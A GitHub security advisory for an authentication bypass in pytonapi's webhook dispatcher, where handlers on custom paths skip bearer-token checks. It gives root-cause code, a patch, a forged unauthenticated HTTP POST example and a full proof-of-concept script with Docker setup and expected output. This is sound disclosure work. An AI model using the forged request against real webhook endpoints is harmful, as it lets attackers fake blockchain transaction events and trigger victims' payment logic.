# [H] pytonapi has a Webhook Custom Path Authentication Bypass

## Summary
Severity: High
Advisory: GHSA-3fcr-jvgp-7f58
CVE: CVE-2026-54635
CWE: CWE-287
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-07-28
Source: https://github.com/advisories/GHSA-3fcr-jvgp-7f58
Type: github-advisory

## Affected
- PyPI: `pytonapi` — affected >=2.0.0 <2.2.1

## Details
## Webhook Custom Path Authentication Bypass in pytonapi

### Summary

`TonapiWebhookDispatcher` in pytonapi 2.2.0 fails to validate the `Authorization` header when a webhook handler is registered with the documented `path=` argument. During `setup()`, bearer tokens are stored only under the default suffix paths (e.g., `/hook/account-tx`), but the custom path (e.g., `/hook/custom`) is never added to the token map. When an incoming request arrives at the custom path, `self._tokens.get(path)` returns `None`, causing the `if expected_token is not None` guard to evaluate to `False` and silently skip authentication entirely. An unauthenticated remote attacker can POST arbitrary forged payloads to the custom webhook endpoint and trigger victim-defined handlers with full integrity impact.

### Details

The vulnerability is a fail-open authentication check in `pytonapi/webhook/dispatcher.py`.

**Token registration (setup)** stores tokens only under default suffix paths:

```python
# dispatcher.py lines 109-112
suffix = self.DEFAULT_SUFFIXES[event_type]
local_path = self._path + suffix          # e.g., "/hook/account-tx"
webhook = await self._client.ensure(f"{self._url}{suffix}")
self._tokens[local_path] = webhook.token  # custom path is NEVER stored here
```

**Handler registration** preserves the custom path in the handler tuple:

```python
# dispatcher.py lines 339, 342
resolved_path = path or self._resolve_path(event_type)  # -> "/hook/custom"
self._handlers[event_type].append((account_filter, fn, resolved_path))
```

**Path routing** (`_build_path_map`) correctly maps the custom path to the event type:

```python
# dispatcher.py line 182
return {handlers[0][2]: et for et, handlers in self._handlers.items() if handlers}
# -> {"/hook/custom": WebhookEventType.ACCOUNT_TX}
```

**Authentication check** (fail-open):

```python
# dispatcher.py lines 286-288
expected_token = self._tokens.get(path)        # "/hook/custom" -> None
if expected_token is not None and authorization != f"Bearer {expected_token}":
    raise TONAPIError("Invalid webhook token")  # SKIPPED because expected_token is None
```

Because `expected_token` is `None` for any custom path, the condition `expected_token is not None` is always `False`. The `raise` is never reached regardless of what the `Authorization` header contains — or whether it is absent entirely. Execution continues to lines 291 and 297 where the attacker's payload is parsed and the victim handler is invoked.

The `path=` argument is an officially documented feature (see `docs/webhooks/guide.mdx` lines 140 and 153), meaning any user following the public documentation is vulnerable.

### PoC

**Requirements:** Python 3.12, pytonapi 2.2.0 installed from source (commit `e46c4a4`).

**Build and run with Docker:**

```bash
# From the repository root
docker build -t vuln001-pytonapi -f vuln-001/Dockerfile .
docker run --rm vuln001-pytonapi
```

The Dockerfile installs pytonapi from the local source tree and executes `poc.py`.

**What the PoC does:**

1. Creates a `TonapiWebhookDispatcher` with a custom-path handler (`path="/hook/custom"`).
2. Calls `setup()` — tokens are registered only for `/hook/account-tx`.
3. **Case A** — calls `process("/hook/custom", forged_payload, authorization=None)`: no `Authorization` header, handler fires.
4. **Case B** — calls `process("/hook/custom", forged_payload, authorization="Bearer totally-wrong-token")`: wrong token, handler still fires.
5. **Case C** (control) — same attack against the default path `/hook/account-tx` with no auth: correctly raises `TONAPIError`.
6. **Case D** (control) — default path with valid token: correctly accepted.

**Simulated malicious HTTP request routed to the victim dispatcher:**

```
POST /hook/custom HTTP/1.1
Host: victim.example
Content-Type: application/json
# No Authorization header

{"event_type":"account_tx","account_id":"0:victim","lt":1,"tx_hash":"FORGED_TX_HASH"}
```

**Expected output confirming the vulnerability:**

```
[dispatcher_a] _tokens map: {'/hook/account-tx': 'real-secret-token-abc123'}

Case A: VULNERABLE — handler invoked with NO Authorization header; custom_called=['FORGED_TX_HASH']
Case B: VULNERABLE — handler invoked with WRONG Authorization header; custom_called=['FORGED_TX_HASH']
Case C: CORRECTLY_REJECTED — Invalid webhook token
Case D: CORRECTLY_ACCEPTED — default path with valid auth

[RESULT] VULNERABILITY CONFIRMED
```

**Remediation (patch):**

```diff
--- a/pytonapi/webhook/dispatcher.py
+++ b/pytonapi/webhook/dispatcher.py
@@
     def _build_path_map(self) -> dict[str, WebhookEventType]:
-        return {handlers[0][2]: et for et, handlers in self._handlers.items() if handlers}
+        return {path: et for et, handlers in self._handlers.items() for _, _, path in handlers}
@@
-            suffix = self.DEFAULT_SUFFIXES[event_type]
-            local_path = self._path + suffix
-            webhook = await self._client.ensure(f"{self._url}{suffix}")
-            self._tokens[local_path] = webhook.token
+            local_paths = sorted({path for _, _, path in handlers})
+            for local_path in local_paths:
+                endpoint = self._endpoint_for_path(local_path)
+                webhook = await self._client.ensure(endpoint)
+                self._tokens[local_path] = webhook.token
@@
+    def _endpoint_for_path(self, path: str) -> str:
+        parsed = urlparse(self._url)
+        return parsed._replace(path=path, params="", query="", fragment="").geturl()
```

### Impact

This is an **Improper Authentication** vulnerability (CWE-287). Any application that:

1. Uses `TonapiWebhookDispatcher` from pytonapi 2.2.0, **and**
2. Registers at least one handler using the documented `path=` keyword argument,

is fully exposed. The webhook endpoint becomes publicly callable without credentials. An unauthenticated network attacker can:

- Forge arbitrary TON blockchain events (e.g., fake `account_tx` notifications).
- Trigger victim-defined business logic — payment processing, account state updates, notification dispatch — with attacker-controlled data.
- Cause financial or operational harm depending on what the victim handler does.

Confidentiality is not directly affected (the attacker sends data, does not read it). Availability is not the primary impact. Integrity is critically impacted because the attacker fully controls the event data delivered to the handler.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
FROM python:3.12-slim

WORKDIR /app

# Copy the repository source code
COPY repo/ /app/repo/

# Install pytonapi from local source (exact commit under test)
RUN pip install --no-cache-dir /app/repo/

# Copy the proof-of-concept script
COPY vuln-001/poc.py /app/poc.py

# Run the PoC by default
CMD ["python3", "/app/poc.py"]
```

#### `poc.py`

```python
"""
PoC for VULN-001: Webhook custom path authentication bypass
===========================================================
CVE candidate: CWE-287 — Improper Authentication
Affected:      pytonapi 2.2.0 (commit e46c4a4)
File:          pytonapi/webhook/dispatcher.py

Root cause
----------
When a handler is registered with the documented `path=` argument:

    @dispatcher.account_tx(path="/hook/custom")
    async def on_tx(event): ...

setup() stores the bearer token ONLY for the default-suffix path:

    local_path = self._path + suffix       # -> "/hook/account-tx"
    self._tokens[local_path] = webhook.token   # line 112

The custom path "/hook/custom" is never added to _tokens.

_build_path_map() correctly routes "/hook/custom" -> ACCOUNT_TX
because it reads handlers[0][2] which IS the custom path when the
custom-path handler is the only one registered.

In process():

    expected_token = self._tokens.get(path)   # line 286 -> None (missing)
    if expected_token is not None and ...:    # line 287 -> False (SKIP)
        raise TONAPIError("Invalid webhook token")

Because expected_token is None the auth check is bypassed entirely
(fail-open). An attacker can POST any forged payload to the custom
path without any Authorization header and trigger the victim handler.

Test matrix
-----------
Case A: custom path + no auth          -> SHOULD raise  (BUG: passes)
Case B: custom path + wrong auth token -> SHOULD raise  (BUG: passes)
Case C: default path + no auth         -> SHOULD raise  (control: correctly raises)
Case D: default path + valid auth      -> SHOULD pass   (control: correctly passes)
"""

import asyncio
import sys

from pytonapi.exceptions import TONAPIError
from pytonapi.webhook.dispatcher import TonapiWebhookDispatcher


# ---------------------------------------------------------------------------
# Minimal stubs — no real network I/O needed
# ---------------------------------------------------------------------------

class FakeWebhookEndpoint:
    """Simulates the TONAPI webhook object returned by client.ensure()."""

    def __init__(self, token: str) -> None:
        self.token = token

    async def sync_accounts(self, accounts: list) -> None:
        pass


class FakeWebhookClient:
    """Simulates TonapiWebhookClient: records which endpoints were registered."""

    def __init__(self) -> None:
        self.registered_endpoints: list[str] = []

    async def create_session(self) -> None:
        pass

    async def ensure(self, endpoint: str) -> FakeWebhookEndpoint:
        self.registered_endpoints.append(endpoint)
        return FakeWebhookEndpoint(token="real-secret-token-abc123")

    async def close_session(self) -> None:
        pass


# ---------------------------------------------------------------------------
# PoC
# ---------------------------------------------------------------------------

async def run_poc() -> bool:
    """Execute all test cases and return True if the vulnerability is confirmed."""

    # -----------------------------------------------------------------
    # Dispatcher A: only a CUSTOM path handler (the vulnerable scenario)
    # -----------------------------------------------------------------
    client_a = FakeWebhookClient()
    dispatcher_a = TonapiWebhookDispatcher(
        "https://victim.example/hook",
        client=client_a,
        accounts=["0:victim"],
    )
    custom_called: list[str] = []

    # Victim uses the documented path= feature (see docs/webhooks/guide.mdx:140)
    @dispatcher_a.account_tx("0:victim", path="/hook/custom")
    async def on_custom_tx(event) -> None:
        custom_called.append(event.tx_hash)

    await dispatcher_a.setup()

    # -----------------------------------------------------------------
    # Dispatcher B: only a DEFAULT path handler (control group)
    # -----------------------------------------------------------------
    client_b = FakeWebhookClient()
    dispatcher_b = TonapiWebhookDispatcher(
        "https://victim.example/hook",
        client=client_b,
        accounts=["0:victim"],
    )
    default_called: list[str] = []

    @dispatcher_b.account_tx("0:victim")
    async def on_default_tx(event) -> None:
        default_called.append(event.tx_hash)

    await dispatcher_b.setup()

    print("=" * 60)
    print("VULN-001: Webhook custom path authentication bypass PoC")
    print("=" * 60)
    print(f"[dispatcher_a] registered paths  : {dispatcher_a.paths}")
    print(f"[dispatcher_a] endpoints called  : {client_a.registered_endpoints}")
    print(f"[dispatcher_a] _tokens map       : {dispatcher_a._tokens}")
    print()
    print(f"[dispatcher_b] registered paths  : {dispatcher_b.paths}")
    print(f"[dispatcher_b] endpoints called  : {client_b.registered_endpoints}")
    print(f"[dispatcher_b] _tokens map       : {dispatcher_b._tokens}")
    print()

    forged_payload = {
        "event_type": "account_tx",
        "account_id": "0:victim",
        "lt": 1,
        "tx_hash": "FORGED_TX_HASH",
    }

    results: dict[str, str] = {}

    # ------------------------------------------------------------------
    # Case A: custom path, NO auth -> BUG: should raise, actually passes
    # ------------------------------------------------------------------
    custom_called.clear()
    try:
        await dispatcher_a.process(
            "/hook/custom",
            forged_payload,
            authorization=None,
        )
        if "FORGED_TX_HASH" in custom_called:
            results["A"] = (
                "VULNERABLE — handler invoked with NO Authorization header; "
                "custom_called=" + repr(custom_called)
            )
        else:
            results["A"] = "UNCERTAIN — process() did not raise but handler was not called"
    except TONAPIError as exc:
        results["A"] = f"NOT_VULNERABLE (raised) — {exc}"

    # ------------------------------------------------------------------
    # Case B: custom path, WRONG auth -> BUG: should raise, actually passes
    # ------------------------------------------------------------------
    custom_called.clear()
    try:
        await dispatcher_a.process(
            "/hook/custom",
            forged_payload,
            authorization="Bearer totally-wrong-token",
        )
        if "FORGED_TX_HASH" in custom_called:
            results["B"] = (
                "VULNERABLE — handler invoked with WRONG Authorization header; "
                "custom_called=" + repr(custom_called)
            )
        else:
            results["B"] = "UNCERTAIN — process() did not raise but handler was not called"
    except TONAPIError as exc:
        results["B"] = f"NOT_VULNERABLE (raised) — {exc}"

    # ------------------------------------------------------------------
    # Case C: default path, NO auth -> must raise (control: works correctly)
    # ------------------------------------------------------------------
    default_called.clear()
    try:
        await dispatcher_b.process(
            "/hook/account-tx",
            forged_payload,
            authorization=None,
        )
        results["C"] = "UNEXPECTED_PASS — default path accepted no-auth (unexpected)"
    except TONAPIError as exc:
        results["C"] = f"CORRECTLY_REJECTED — {exc}"

    # ------------------------------------------------------------------
    # Case D: default path, VALID auth -> baseline, must succeed (control)
    # ------------------------------------------------------------------
    default_called.clear()
    try:
        await dispatcher_b.process(
            "/hook/account-tx",
            forged_payload,
            authorization="Bearer real-secret-token-abc123",
        )
        if "FORGED_TX_HASH" in default_called:
            results["D"] = "CORRECTLY_ACCEPTED — default path with valid auth"
        else:
            results["D"] = "UNCERTAIN — process() did not raise but handler was not called"
    except TONAPIError as exc:
        results["D"] = f"UNEXPECTED_REJECTION — {exc}"

    # ------------------------------------------------------------------
    # Summary
    # ------------------------------------------------------------------
    print("Test results:")
    for case, result in results.items():
        print(f"  Case {case}: {result}")
    print()

    vuln_confirmed = (
        "VULNERABLE" in results.get("A", "")
        and "VULNERABLE" in results.get("B", "")
        and "CORRECTLY_REJECTED" in results.get("C", "")
        and "CORRECTLY_ACCEPTED" in results.get("D", "")
    )

    if vuln_confirmed:
        print("[RESULT] VULNERABILITY CONFIRMED")
        print("  dispatcher_a._tokens has NO entry for /hook/custom (only for /hook/account-tx)")
        print("  => expected_token=None => auth check skipped => forged handler called")
        print("  Attacker can POST any payload to /hook/custom without credentials.")
    else:
        print("[RESULT] VULNERABILITY NOT CONFIRMED")
        print("  Check individual case results above for details.")

    return vuln_confirmed


if __name__ == "__main__":
    confirmed = asyncio.run(run_poc())
    sys.exit(0 if confirmed else 1)
```

## References
- https://github.com/nessshon/tonapi/security/advisories/GHSA-3fcr-jvgp-7f58
- https://nvd.nist.gov/vuln/detail/CVE-2026-54635
- https://github.com/nessshon/tonapi/commit/854222b7ee68d3fb7b4d6d899d200f388483bd86
- https://github.com/nessshon/tonapi
- https://github.com/nessshon/tonapi/releases/tag/v2.2.1
- https://github.com/pypa/advisory-database/tree/main/vulns/pytonapi/PYSEC-2026-3614.yaml
